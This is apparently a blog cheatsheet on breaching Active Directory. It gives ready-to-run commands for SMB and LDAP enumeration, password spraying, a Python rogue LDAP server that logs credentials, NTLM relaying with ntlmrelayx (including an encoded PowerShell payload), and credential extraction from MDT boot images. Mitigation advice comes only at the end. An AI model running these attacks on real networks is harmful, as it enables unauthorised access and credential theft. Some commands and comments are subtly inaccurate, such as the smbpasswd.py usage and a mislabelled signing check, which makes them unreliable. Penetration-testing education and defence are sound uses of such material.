---
layout: post
title: Active Directory Breaching Techniques
date: 2025-04-10 16:38 +0300
categories: [Network Security, Active Directory]
tags: [active directory, windows]
---

## Introduction

This cheatsheet focuses on initial access vectors for breaching Active Directory environments. These techniques target the perimeter of an AD forest, allowing attackers to gain that crucial first foothold. Understanding these methods is essential for security professionals to properly secure their environments.

## NTLM Authenticated Services

NTLM (NT LAN Manager) authenticated services expose authentication endpoints that can be targeted for initial access.

### Common NTLM-Authenticated Services

```bash
# Common ports for NTLM-authenticated services
TCP 445 - SMB
TCP 135 - RPC/DCOM
TCP 139 - NetBIOS Session
TCP 1433 - MSSQL
TCP 5985/5986 - WinRM
TCP 80/443 - Web applications with NTLM auth
```

### SMB Enumeration

```bash
# Nmap scan for SMB
nmap -p 445 --script=smb-protocols,smb-security-mode,smb-enum-shares 10.10.10.0/24

# CrackMapExec to enumerate SMB
crackmapexec smb 10.10.10.0/24 --shares

# Checking anonymous access
smbclient -N -L //10.10.10.100/
smbmap -H 10.10.10.100 -u anonymous -p ""
```

### MSSQL Enumeration

```bash
# Scan for MSSQL instances
nmap -p 1433 --script=ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password 10.10.10.0/24

# Check for default credentials
crackmapexec mssql 10.10.10.100 -u sa -p 'sa'

# Using Impacket for MSSQL enumeration
python3 mssqlclient.py DOMAIN/user:password@10.10.10.100
```

### WinRM Enumeration

```bash
# Check for WinRM availability
crackmapexec winrm 10.10.10.0/24

# Test credentials over WinRM
evil-winrm -i 10.10.10.100 -u user -p 'password'
```

## Password Spraying

Password spraying involves trying a single common password against many usernames, avoiding account lockout policies.

### User Enumeration First

```bash
# LDAP user enumeration
ldapsearch -x -h 10.10.10.100 -D "cn=user,dc=domain,dc=local" -w "password" -b "dc=domain,dc=local" "(objectClass=user)" sAMAccountName | grep sAMAccountName

# RPC user enumeration
rpcclient -U "" -N 10.10.10.100 -c "enumdomusers"

# Kerbrute for user enumeration without authentication
kerbrute userenum --dc 10.10.10.100 -d domain.local userlist.txt
```

### Password Spraying Tools

```bash
# Using crackmapexec against SMB
crackmapexec smb 10.10.10.100 -u users.txt -p 'Spring2025!' --continue-on-success

# Using kerbrute for Kerberos pre-auth
kerbrute passwordspray --dc 10.10.10.100 -d domain.local users.txt 'Spring2025!'

# Using Impacket's smbpasswd.py
python3 smbpasswd.py domain.local/'Spring2025!'@10.10.10.100 users.txt

# Check user lockout policy first
crackmapexec smb 10.10.10.100 -u validuser -p validpass --pass-pol
```

### Recommended Password Spray Approach

1. Identify lockout threshold (e.g., 5 attempts before lockout)
2. Collect as many usernames as possible
3. Try 1 password against all users
4. Wait for lockout counter to reset (typically 30 mins)
5. Try next password against all users

## LDAP Bind Credentials

LDAP bind credentials can be found in various places and provide direct access to the domain.

### Finding LDAP Bind Credentials

```bash
# Common locations for LDAP credentials
- Web application config files (.config, .xml, .json, .yml)
- Registry keys (on workstations with LDAP-integrated apps)
- Environment variables
- Connection strings in deployed applications
- Clear-text configuration files in shared folders
- Service configuration files
```

### Testing LDAP Bind Credentials

```bash
# Verify LDAP binding works
ldapsearch -x -h 10.10.10.100 -D "cn=ldapuser,cn=Users,dc=domain,dc=local" -w "password" -b "dc=domain,dc=local" -s base "(objectClass=*)"

# Enumerate users using discovered credentials
ldapsearch -x -h 10.10.10.100 -D "cn=ldapuser,cn=Users,dc=domain,dc=local" -w "password" -b "dc=domain,dc=local" "(objectClass=user)" sAMAccountName

# Using Python for LDAP enumeration with credentials
python3 windapsearch.py --dc-ip 10.10.10.100 -d domain.local -u ldapuser -p password -U
```

## LDAP Pass-Back Attack

LDAP Pass-Back attacks exploit misconfigured LDAP integrations that connect back to attacker-controlled LDAP servers.

### Identifying Vulnerable Systems

```
- Applications configured to use LDAP authentication
- Network devices (routers, switches) with LDAP authentication
- Printers and IoT devices with LDAP integration
- Web applications with misconfigured LDAP settings
```

### Setting Up Rogue LDAP Server

```bash
# Using nc to see incoming connection attempts
nc -lvnp 389

# Using Python3's ldaptor for a minimal LDAP server
pip3 install ldaptor
python3 rogue_ldap_server.py

# Using ntlmrelayx to capture NTLM hashes
ntlmrelayx.py -t ldap://10.10.10.100 --ldap-relay-port 389
```

### Example Python Rogue LDAP Server

```python
from twisted.internet import reactor, defer
from twisted.internet.protocol import ServerFactory
from ldaptor.protocols.ldap import ldaperrors
from ldaptor.protocols.ldap.ldapserver import LDAPServer

class LoggingLDAPServer(LDAPServer):
    def handle_bind_request(self, request, controls, reply):
        print(f"Bind Request: {request.auth}")
        print(f"Received credentials - DN: {request.dn}, Password: {request.auth}")
        return defer.succeed(None)

if __name__ == "__main__":
    factory = ServerFactory.forProtocol(LoggingLDAPServer)
    reactor.listenTCP(389, factory)
    print("LDAP server running on port 389")
    reactor.run()
```

## Hosting a Rogue LDAP Server

A more comprehensive approach to capturing credentials via fake LDAP services.

### Using Responder

```bash
# Start Responder to capture credentials
sudo responder -I eth0 -w -v

# Check captured hashes
cat /usr/share/responder/logs/NTLM-*
```

### Using ntlmrelayx for LDAP Server

```bash
# Start ntlmrelayx in LDAP server mode
ntlmrelayx.py -tf targets.txt -l /tmp/ntlmrelay -smb2support -of hashes.txt
```

### LDAP Server with OpenLDAP

```bash
# Install and configure OpenLDAP
apt install slapd ldap-utils
dpkg-reconfigure slapd

# Configure slapd for logging credentials
vim /etc/ldap/slapd.conf
# Add: loglevel 256
```

## Authentication Relays

Authentication relay attacks involve intercepting authentication attempts and relaying them to another system.

### SMB Relay Attack

```bash
# Disable SMB signing on target first
nmap -p 445 --script=smb-security-mode 10.10.10.0/24 | grep -A 2 "security-mode" | grep "message_signing"

# Find potential targets with SMB signing disabled
crackmapexec smb 10.10.10.0/24 --gen-relay-list targets.txt

# Run ntlmrelayx
ntlmrelayx.py -tf targets.txt -smb2support -c "powershell -enc BASE64_ENCODED_PAYLOAD"

# Using Responder with ntlmrelayx
# First edit Responder.conf to disable SMB and HTTP servers
sudo nano /usr/share/responder/Responder.conf
# Set SMB = Off and HTTP = Off

# Then start Responder
sudo responder -I eth0 -v

# In another terminal, start ntlmrelayx
sudo ntlmrelayx.py -tf targets.txt -smb2support -i
```

### LDAP Relay

```bash
# LDAP/S relay attack
ntlmrelayx.py -t ldap://10.10.10.100 --delegate-access --escalate-user compromised_user

# Execute commands via LDAP relay
ntlmrelayx.py -t ldaps://10.10.10.100 --add-computer relay-attack 'P@ssw0rd123'
```

### HTTP/WebDAV Relay

```bash
# Create a WebDAV share to capture hashes
wsgidav --host=0.0.0.0 --port=80 --auth=ntlm

# Use with ntlmrelayx
ntlmrelayx.py -t http://10.10.10.100 -smb2support
```

## Microsoft Deployment Toolkit (MDT) Attacks

MDT deployments often contain credentials and sensitive information that can be leveraged for initial access.

### Identifying MDT Deployments

```bash
# Scan for PXE boot servers
nmap -p 67,68,69,4011 -sU 10.10.10.0/24

# Look for MDT services
nmap -p 80,443 --script=http-title 10.10.10.0/24 | grep -i "deployment"

# Checking for open deployment shares
crackmapexec smb 10.10.10.100 -u '' -p '' --shares | grep -i "deployment"
```

### PXE Boot Image Retrieval

```bash
# Using PowerPXE to grab bootloader
.\PowerPXE.ps1
Get-PXEBootImage -ServerIP 10.10.10.100 -Architecture x64

# Extracting BCD file
bcdedit /store BCD /enum all

# Using DHCP to discover PXE
python3 PXEThief.py -m discover -i eth0
```

### Extracting Credentials from MDT Files

```bash
# Bootstrap.ini often contains credentials
cat .\Bootstrap.ini

# Sample content:
[Settings]
Priority=Default

[Default]
DeployRoot=\\MDT-SERVER\DeploymentShare$
UserID=MDT_User
UserDomain=domain.local
UserPassword=Password123!
```

### Mounting and Analyzing WIM Files

```bash
# Mount a WIM file on Linux
mkdir /mnt/wim
wimlib-imagex mount boot.wim 1 /mnt/wim

# Extract bootstrap.ini
cp /mnt/wim/Deploy/Scripts/bootstrap.ini ./

# Extract customsettings.ini
cp /mnt/wim/Deploy/Scripts/customsettings.ini ./

# Unmount
wimlib-imagex unmount /mnt/wim
```

## Credential Dumping from MDT Images

Once you have access to MDT images, extracting credentials is the next step.

### Analyzing Bootstrap.ini and CustomSettings.ini

```bash
# Common credentials in CustomSettings.ini
grep -i "password" customsettings.ini
grep -i "username\|userid" customsettings.ini

# Check for admin passwords
grep -i "adminpassword" customsettings.ini

# Check for join domain credentials
grep -i "joindomainusername" customsettings.ini
```

### Extracting Credentials from Mounted Images

```bash
# Search for credentials in scripts
grep -r "password" /mnt/wim/

# Look for hardcoded credentials in XML files
grep -r "<password>" /mnt/wim/

# Check for autologon settings
grep -r "DefaultPassword" /mnt/wim/
```

### Extracting from Task Sequences

```bash
# Locate task sequence files
find /mnt/wim -name "*.xml" | xargs grep -l "password"

# Extract commands from task sequences
python3 ts_parser.py -f /path/to/tasksequence.xml --passwords
```

## Detection & Prevention

### Detecting Password Spraying

- Monitor for multiple failed login attempts across different accounts
- Look for authentication attempts with common passwords
- Implement account lockout policies with incremental timeouts
- Set alerts for authentication from unusual IP addresses or outside normal hours

### Preventing LDAP Attacks

- Use certificate-based authentication for LDAP
- Implement LDAP signing and channel binding
- Avoid storing LDAP credentials in clear-text configurations
- Use dedicated service accounts with minimal privileges for LDAP binds
- Always validate LDAP server certificates

### Mitigating Relay Attacks

- Enable SMB signing on all systems
- Enable LDAP signing and channel binding
- Use Extended Protection for Authentication (EPA)
- Implement Network Level Authentication (NLA)
- Segment networks to prevent cross-segment NTLM relay attacks

### Securing MDT Deployments

- Use one-time deployment accounts that are automatically disabled
- Encrypt sensitive data in deployment configurations
- Implement network segmentation for deployment infrastructure
- Monitor and audit access to deployment shares
- Use secure transport for all deployment traffic

## References

1. [MITRE ATT&CK - Initial Access](https://attack.mitre.org/tactics/TA0001/)
2. [PXE Boot Attacks - MDSec](https://www.mdsec.co.uk/2020/04/relaying-to-victory/)
3. [NTLM Relay Attacks - Dirk-jan Mollema](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)
4. [LDAP Pass-Back Attacks - Rhino Security Labs](https://rhinosecuritylabs.com/network-security/ldap-pass-back-attack/)
5. [SpecterOps - Adversary Tradecraft in Active Directory](https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f)

